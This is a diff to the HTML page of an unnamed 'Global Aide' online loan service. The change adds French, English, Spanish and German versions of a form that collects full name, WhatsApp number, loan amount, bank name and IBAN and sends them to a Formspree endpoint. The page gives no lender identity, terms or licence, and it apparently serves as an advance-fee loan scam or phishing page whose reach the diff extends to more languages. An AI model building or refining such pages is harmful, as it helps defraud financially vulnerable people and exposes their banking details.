@@ -7,41 +7,68 @@
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-50 font-sans">
+
     <section class="min-h-screen flex flex-col items-center justify-center p-6 bg-blue-700 text-white text-center">
         <h1 class="text-5xl font-black mb-4">Global Aide</h1>
-        <p class="text-xl mb-8">Soutien financier sérieux et rapide pour tous.</p>
-        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-10 py-4 rounded-full font-bold text-xl uppercase">Commencer</a>
+        <p class="text-xl mb-8 opacity-90" id="hero-sub">Soutien financier sérieux, honnête et rapide pour tous.</p>
+        
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10 w-full max-w-2xl">
+            <button onclick="changeLanguage('fr')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇫🇷 Français</button>
+            <button onclick="changeLanguage('en')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇺🇸 English</button>
+            <button onclick="changeLanguage('es')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇪🇸 Español</button>
+            <button onclick="changeLanguage('de')" class="bg-white/20 hover:bg-white/40 p-3 rounded-lg border border-white/30">🇩🇪 Deutsch</button>
+        </div>
+        <a href="#formulaire" class="bg-yellow-400 text-blue-900 px-10 py-4 rounded-full font-bold text-xl uppercase" id="btn-start">Continuer</a>
     </section>
 
-    <section id="formulaire" class="max-w-4xl mx-auto my-10 p-8 bg-white rounded-3xl shadow-2xl">
-        <h2 class="text-3xl font-bold mb-8 text-center text-blue-800">Demande de Prêt en Ligne</h2>
+    <section id="formulaire" class="max-w-4xl mx-auto my-20 p-8 bg-white rounded-3xl shadow-2xl">
+        <h2 class="text-3xl font-bold mb-8 text-center text-blue-800" id="form-title">Demande de Prêt en Ligne</h2>
         
         <form action="https://formspree.io/f/xnjqwngo" method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-6">
             <div>
-                <label class="block text-sm font-bold mb-2">NOM COMPLET</label>
+                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-nom">Nom complet</label>
                 <input type="text" name="nom" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
             <div>
-                <label class="block text-sm font-bold mb-2">WHATSAPP</label>
-                <input type="tel" name="whatsapp" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
+                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-tel">Numéro WhatsApp</label>
+                <input type="tel" name="telephone" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
             <div>
-                <label class="block text-sm font-bold mb-2">MONTANT SOUHAITÉ</label>
+                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-montant">Montant souhaité</label>
                 <input type="number" name="montant" required class="w-full p-4 bg-gray-50 border rounded-xl text-black">
             </div>
             <div>
-                <label class="block text-sm font-bold mb-2">NOM DE LA BANQUE</label>
+                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-banque">Nom de la Banque</label>
                 <input type="text" name="banque" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
             </div>
             <div class="col-span-full">
-                <label class="block text-sm font-bold mb-2">IBAN / NUMÉRO DE COMPTE</label>
+                <label class="block text-sm font-bold mb-2 uppercase" id="lbl-iban">IBAN / Numéro de compte</label>
                 <input type="text" name="iban" required class="w-full p-4 bg-blue-50 border rounded-xl text-black">
             </div>
-            <button type="submit" class="col-span-full bg-blue-600 text-white p-5 rounded-xl font-bold text-xl hover:bg-blue-700 shadow-lg">
-                ENVOYER MA DEMANDE
-            </button>
+            <button type="submit" class="col-span-full bg-blue-600 text-white p-5 rounded-xl font-bold text-xl hover:bg-blue-700 shadow-lg" id="btn-submit">Envoyer ma demande</button>
         </form>
     </section>
+
+    <script>
+        const translations = {
+            fr: { hero: "Soutien financier sérieux, honnête et rapide pour tous.", start: "Continuer", title: "Demande de Prêt en Ligne", nom: "Nom complet", tel: "Numéro WhatsApp", montant: "Montant souhaité", banque: "Nom de la Banque", iban: "IBAN / Numéro de compte", submit: "Envoyer ma demande" },
+            en: { hero: "Serious, honest and fast financial support for all.", start: "Continue", title: "Online Loan Application", nom: "Full Name", tel: "WhatsApp Number", montant: "Amount requested", banque: "Bank Name", iban: "IBAN / Account Number", submit: "Submit application" },
+            es: { hero: "Apoyo financiero serio, honesto y rápido para todos.", start: "Continuar", title: "Solicitud de Préstamo", nom: "Nombre completo", tel: "WhatsApp", montant: "Monto solicitado", banque: "Nombre del banco", iban: "IBAN / Número de cuenta", submit: "Enviar solicitud" },
+            de: { hero: "Seriöse und schnelle finanzielle Unterstützung für alle.", start: "Weiter", title: "Kreditantrag Online", nom: "Vollständiger Name", tel: "WhatsApp Nummer", montant: "Wunschbetrag", banque: "Bankname", iban: "IBAN / Kontonummer", submit: "Antrag senden" }
+        };
+
+        function changeLanguage(lang) {
+            document.getElementById('hero-sub').innerText = translations[lang].hero;
+            document.getElementById('btn-start').innerText = translations[lang].start;
+            document.getElementById('form-title').innerText = translations[lang].title;
+            document.getElementById('lbl-nom').innerText = translations[lang].nom;
+            document.getElementById('lbl-tel').innerText = translations[lang].tel;
+            document.getElementById('lbl-montant').innerText = translations[lang].montant;
+            document.getElementById('lbl-banque').innerText = translations[lang].banque;
+            document.getElementById('lbl-iban').innerText = translations[lang].iban;
+            document.getElementById('btn-submit').innerText = translations[lang].submit;
+        }
+    </script>
 </body>
 </html>
 
